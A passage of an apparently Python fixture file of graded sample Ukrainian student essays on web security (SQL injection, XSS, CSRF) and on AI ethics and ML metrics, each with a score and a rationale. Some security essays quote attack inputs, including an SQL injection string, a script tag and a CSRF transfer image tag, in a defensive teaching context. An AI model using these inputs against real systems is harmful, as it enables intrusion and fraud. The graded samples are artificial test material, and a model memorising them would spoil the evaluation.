                    "2. Прапорець HttpOnly для cookie сесії: забороняє будь-якому JavaScript доступ до `document.cookie`;\n"
                    "3. Заголовки Content Security Policy (CSP): блокування виконання сторонніх скриптів.\n\n"
                    "====================================================================\n"
                    "3. CROSS-SITE REQUEST FORGERY (CSRF — підробка запитів)\n"
                    "====================================================================\n"
                    "Механізм атаки:\n"
                    "Зловмисник змушує браузер авторизованого користувача таємно надіслати HTTP-запит до цільового вебсервісу від імені жертви "
                    "(наприклад, переказ коштів або зміна email: `<img src=\"https://bank.ua/transfer?to=hacker&amount=1000\">`). "
                    "Оскільки жертва вже залогінена, браузер автоматично підставляє її куки авторизації.\n\n"
                    "Методи захисту:\n"
                    "1. Anti-CSRF токени (`{% csrf_token %}`): сервер генерує унікальний криптографічний одноразовий ключ у формі. "
                    "При отриманні POST-запиту сервер звіряє токен із сесією. Сторонній сайт не може прочитати цей токен через політику Same-Origin Policy;\n"
                    "2. Cookie з прапорцем `SameSite=Lax` або `Strict`: браузер не прикріплює сесійні куки до крос-доменних запитів зі сторонніх сайтів."
                ),
                'comment_student': "Доброго дня! Підготувала ґрунтовний звіт з кібербезпеки: SQLi з Prepared Statements, розбір Stored/Reflected XSS з прапорцем HttpOnly та механізм захисту CSRF токенами і SameSite.",
                'rationale': "Високий рівень (12 балів). Академічний дослідницький звіт вищої проби: наочний приклад коду ін'єкції та його виправлення, точне розрізнення видів XSS з HttpOnly та вичерпний розбір архітектури CSRF захисту.",
                'gaps': [],
            },
            10: {
                'content': (
                    "Звіт: Вебвразливості та кібербезпека\n"
                    "Виконав: Шевченко Данило, 11-А клас\n\n"
                    "1. SQL Injection:\n"
                    "Коли запит формують так: `query = \"SELECT * FROM users WHERE name='\" + login + \"'\"`.\n"
                    "Якщо хакер введе `' OR '1'='1`, база поверне всі записи без перевірки пароля.\n"
                    "Захист: Використовувати параметризовані запити або ORM (наприклад Django ORM), де змінні передаються окремо через знак питання або %s.\n\n"
                    "2. XSS (Міжсайтовий скриптинг):\n"
                    "Зловмисник вставляє на сайт код на JavaScript, наприклад `<script>alert('Злам');</script>` або крадіжку кукі через `document.cookie`.\n"
                    "Stored XSS зберігається в базі (форум), а Reflected повертається через посилання в пошуку.\n"
                    "Захист: Екранувати символи < та > і ставити на cookie прапорець HttpOnly.\n\n"
                    "3. CSRF (Міжсайтова підробка запитів):\n"
                    "Хакер надсилає жертві посилання, яке від її імені міняє пароль чи переказує гроші на сайті, де користувач уже авторизований.\n"
                    "Захист: Використовувати CSRF-токени в кожній формі (як `{% csrf_token %}` в Django)."
                ),
                'comment_student': "Здав аналітичний звіт з веббезпеки.",
                'rationale': "Високий рівень (10 балів). Усі три вразливості розібрано вірно, приклади векторів атак та захисту (Prepared Statements, HttpOnly, CSRF-токен) правильні. Опис атрибута Cookie `SameSite` відсутній.",
                'gaps': ["Не згадано захисний атрибут cookie SameSite."],
            },
            7: {
                'content': (
                    "Кібербезпека вебу\n"
                    "Бондаренко Анна, 11-А\n\n"
                    "1. SQL-ін'єкція — це коли в поле введення вставляють SQL код наприклад ' OR '1'='1 і отримують доступ до бази даних. Захист — параметризовані запити.\n"
                    "2. XSS — це коли на сторінці запускається чужий JavaScript код і краде паролі користувача. Захист — заборонити теги script.\n"
                    "3. CSRF — це фальшивий запит від імені користувача. Захист — ставити токени перевірки."
                ),
                'comment_student': "Завдання виконала.",
                'rationale': "Достатній рівень (7 балів). Суть усіх трьох загроз зрозуміла. Проте приклади коду не наведені, різниця між збереженим та відбитим XSS не пояснена, захист описано поверхнево.",
                'gaps': ["Немає прикладів коду вразливостей.", "Не розкрито типи XSS."],
            },
            5: {
                'content': (
                    "Звіт з безпеки\n"
                    "Коваль Максим\n\n"
                    "SQL ін'єкція це коли ламають базу даних через сайт. Треба ставити складні паролі до бази.\n"
                    "XSS це вірус на сайті, треба антивірус.\n"
                    "CSRF це спам."
                ),
                'comment_student': "здав",
                'rationale': "Середній рівень (5 балів). Грубі неточності: складні паролі до СУБД не захищають від SQLi (атака йде через вебзастосунок), XSS — це не вірус, а CSRF — це не спам. Механізми захисту відсутні.",
                'gaps': ["Хибні уявлення про захист від SQLi (паролі замість Prepared Statements).", "Неправильне трактування XSS і CSRF."],
            },
            4: {
                'content': (
                    "безпека сайтів від хакерів\n"
                ),
                'comment_student': "здав",
                'rationale': "Початковий рівень (4 бали). Заголовок без звіту, жодна вимога завдання не виконана.",
                'gaps': ["Звіт відсутній."],
            },
        },
    },
    {
        'grade': 11,
        'lesson': 5,
        'title': 'Штучний інтелект: підготовка даних, метрики та етика ШІ',
        'kind': 'txt',
        'description': (
            "Тема уроку: Основи штучного інтелекту та машинного навчання (ML). Підготовка навчальних вибірок, оцінка точності, етичні стандарти ШІ.\n"
            "Завдання:\n"
            "Підготувати аналітичний есей-дослідження щодо розробки та впровадження системи автоматичного оцінювання учнівських робіт на базі ШІ.\n"
            "У роботі необхідно висвітлити 4 ключові аспекти:\n"
            "1. Етапи підготовки навчального датасету (Data Preprocessing): нормалізація ознак, видалення шумів, "
            "вирішення проблеми дисбалансу класів (коли робіт на високий бал значно менше, ніж на середній).\n"
            "2. Проблема упередженості даних (Data Bias / Algorithmic Bias): чому модель ШІ може несправедливо занижувати чи завищувати оцінки "
            "та як сформувати репрезентативну вибірку.\n"
            "3. Метрики оцінки якості класифікації: матриця помилок (Confusion Matrix: TP, FP, TN, FN), "
            "математичний та педагогічний зміст метрик Accuracy (Загальна точність), Precision (Точність), Recall (Повнота) та F1-Score.\n"
            "4. Етичні та правові норми використання ШІ в освіті (рекомендації ЮНЕСКО та ЄС): чому ШІ має залишатися виключно помічником (асистентом), "
            "а фінальне рішення щодо оцінки учня завжди має приймати вчитель (Human-in-the-Loop)."
        ),
        'custom_criteria': (
            "1. Розуміння технологічних етапів попередньої обробки даних машинного навчання (Data Preprocessing).\n"
            "2. Глибина аналізу проблеми алгоритмічної упередженості (Bias) та справедливості оцінювання.\n"
            "3. Математична та сутнісна точність визначення метрик якості ML-моделей (Precision, Recall, F1).\n"
            "4. Зрілість міркувань щодо етики ШІ та принципу «людина в контурі управління» (Human-in-the-Loop)."
        ),
        'submissions': {
            12: {
                'content': (
                    "Аналітичне дослідження: Архітектура систем оцінювання на базі ШІ, метрики валідації та етичні норми\n"
                    "Автор: Ткаченко Марія, учениця 11-А класу\n\n"
                    "1. Попередня обробка даних (Data Preprocessing) для навчання моделей:\n"
                    "Якість будь-якої моделі машинного навчання визначається якістю навчальної вибірки (принцип «Garbage In — Garbage Out»).\n"
                    "• Очищення та нормалізація: видалення дублікатів, виправлення некоректних артефактів розмітки, токенізація текстів та лематизація;\n"
                    "• Подолання дисбалансу класів (Class Imbalance): якщо у вибірці робіт на «12» лише 3%, а на «7-8» — 70%, модель навчиться "
                    "завжди ставити «7», ігноруючи відмінні роботи. Для вирівнювання застосовують методи догенерації меншин (SMOTE / Oversampling) "
                    "або стратифікований поділ вибірки (Stratified Split);\n"
                    "• Розбиття на вибірки: навчальну (Train 70%), валідаційну (Validation 15%) та тестову (Test 15%) для уникнення перенавчання (Overfitting).\n\n"
                    "2. Алгоритмічне зміщення (Data Bias) та репрезентативність:\n"
                    "Якщо модель навчати виключно на роботах учнів одного профільного ліцею, вона виявиться несправедливою (упередженою) "
                    "до робіт учнів загальноосвітніх чи сільських шкіл через специфіку словникового запасу чи оформлення. "
                    "Репрезентативна вибірка має враховувати роботи різного стилю написання, різних навчальних програм та різних форматів здачі.\n\n"
                    "3. Метрики якості класифікації та матриця помилок (Confusion Matrix):\n"
                    "Матриця помилок містить 4 наслідки: True Positive (TP), False Positive (FP), True Negative (TN), False Negative (FN).\n"
                    "• Accuracy = (TP + TN) / Total — показує загальну частку правильних відповідей. При сильному дисбалансі класів метрика оманлива.\n"
                    "• Precision (Точність) = TP / (TP + FP) — з усіх робіт, які ШІ оцінив на високий рівень, скільки дійсно є високим рівнем? "
                    "(Критична метрика проти безпідставного завищення оцінок).\n"
                    "• Recall (Повнота) = TP / (TP + FN) — яку частку справжніх робіт високого рівня модель зуміла виявити? "
                    "(Критична метрика проти заниження та ігнорування успішних робіт).\n"
                    "• F1-Score = 2 * (Precision * Recall) / (Precision + Recall) — гармонійне середнє між точністю та повнотою, "
                    "найбільш об'єктивна комплексна оцінка моделі.\n\n"
                    "4. Етичні стандарти та концепція Human-in-the-Loop:\n"
                    "Згідно з настановами Ради Європи та рекомендаціями ЮНЕСКО щодо етики штучного інтелекту, освітні системи ШІ належать "
                    "до категорії високого ризику (High-Risk AI Systems), оскільки помилкова оцінка може вплинути на психоемоційний стан дитини та її майбутнє.\n"
                    "Тому категорично закріплено принцип Human-in-the-Loop («Людина в контурі прийняття рішень»):\n"
                    "ШІ є лише асистентом вчителя (формує чернетку, підсвічує прогалини, перевіряє формальні критерії). "
                    "Фінальний вердикт, затвердження оцінки та персональний відгук завжди залишаються за живим педагогом, "
                    "а учень має гарантоване право оскаржити оцінку та отримати зрозуміле пояснення від людини."
                ),
                'comment_student': "Доброго дня! Підготувала аналітичне есе про машинне навчання: розібрала SMOTE проти дисбалансу класів, математичні формули Precision/Recall/F1 та етичні норми ЮНЕСКО Human-in-the-Loop.",
                'rationale': "Високий рівень (12 балів). Видатна дослідницька робота університетського рівня: точне математичне та сутнісне визначення метрик класифікації (Precision, Recall, F1), розбір перенавчання й дисбалансу класів, зрілі етичні висновки про Human-in-the-Loop.",
                'gaps': [],
            },
            10: {
                'content': (
                    "Дослідження: Штучний інтелект у перевірці учнівських робіт\n"
                    "Виконав: Бондаренко Анна, 11-А клас\n\n"
                    "1. Підготовка даних:\n"
                    "Перед навчанням моделі треба очистити тексти від сміття, виправити помилки розмітки та нормалізувати дані. "
                    "Також треба стежити щоб у вибірці було порівну робіт на різні оцінки (і на 4, і на 10, і на 12 балів).\n\n"
                    "2. Упередженість ШІ (Bias):\n"
                    "ШІ повторює людські помилки з вибірки. Якщо вчителі раніше занижували оцінки за певний стиль, ШІ теж навчиться занижувати. "
                    "Тому вибірка має бути об'єктивною.\n\n"
                    "3. Метрики оцінки моделі:\n"
                    "- Accuracy — загальна точність (відсоток вгаданих оцінок);\n"
                    "- Precision — точність (чи не завищує ШІ оцінку);\n"
                    "- Recall — повнота (чи не пропустив ШІ якісні роботи);\n"
                    "- F1-Score — комбінація Precision і Recall для чесної оцінки.\n\n"
                    "4. Етика ШІ:\n"
                    "Штучний інтелект не має права сам виставляти семестрову оцінку в журнал без контролю. "
                    "ШІ — це лише помічник для вчителя, а остаточне рішення завжди ухвалює вчитель."
                ),
                'comment_student': "Здала есе про машинне навчання та етику ШІ.",
                'rationale': "Високий рівень (10 балів). Усі 4 аспекти висвітлені грамотно та логічно, метрики класифікації названі вірно, концепцію Human-in-the-Loop розкрито. Відсутні формули матриці помилок (TP, FP, TN, FN).",
                'gaps': ["Метрики Precision та Recall описані якісно без математичних формул через TP/FP/FN."],
            },
            7: {
                'content': (
                    "Штучний інтелект в оцінюванні\n"
                    "Коваль Максим, 11-А\n\n"
                    "1. Дані треба чистити від помилок перед навчанням нейромережі.\n"
                    "2. Упередженість буває коли нейромережі показували тільки роботи відмінників.\n"
                    "3. Метрики — це точність моделі (Accuracy), чим ближче до 100% тим краще працює нейромережа.\n"
                    "4. Етика: комп'ютер не повинен судити людину, оцінку має ставити вчитель бо ШІ може помилятися."
                ),
                'comment_student': "Завдання виконав.",
                'rationale': "Достатній рівень (7 балів). Основні думки правильні, але відсутні поняття Precision, Recall та F1-Score (згадано лише загальну точність Accuracy), етапи передобробки даних описані одним реченням.",
                'gaps': ["Пропущено ключові метрики класифікації Precision, Recall, F1.", "Схематичний опис етапів ML."],
            },
            5: {
                'content': (
                    "Штучний інтелект\n"
                    "Мельник Софія\n\n"
                    "Зараз популярний ChatGPT і його можна навчити перевіряти зошити. Точність у нього висока, десь 90 відсотків. Але учні можуть списувати з іншого ШІ, тому вчитель повинен перевіряти сам."
                ),
                'comment_student': "моя робота про ШІ",
                'rationale': "Середній рівень (5 балів). Відповідь побудована на побутових уявленнях про ChatGPT, поняття навчальної вибірки, нормалізації ознак, матриці помилок та метрик машинного навчання відсутні.",
                'gaps': ["Відсутня технічна складова машинного навчання.", "Метрики та етапи підготовки вибірки не розкриті."],
            },
            4: {
                'content': (
                    "ШІ скоро замінить всі професії і вчителів теж\n"
                ),
                'comment_student': "здала",
                'rationale': "Початковий рівень (4 бали). Одне банальне речення з фантастичних фільмів, вимоги наукового аналітичного есе проігноровані.",
                'gaps': ["Завдання не виконано."],
            },
        },
    },
]
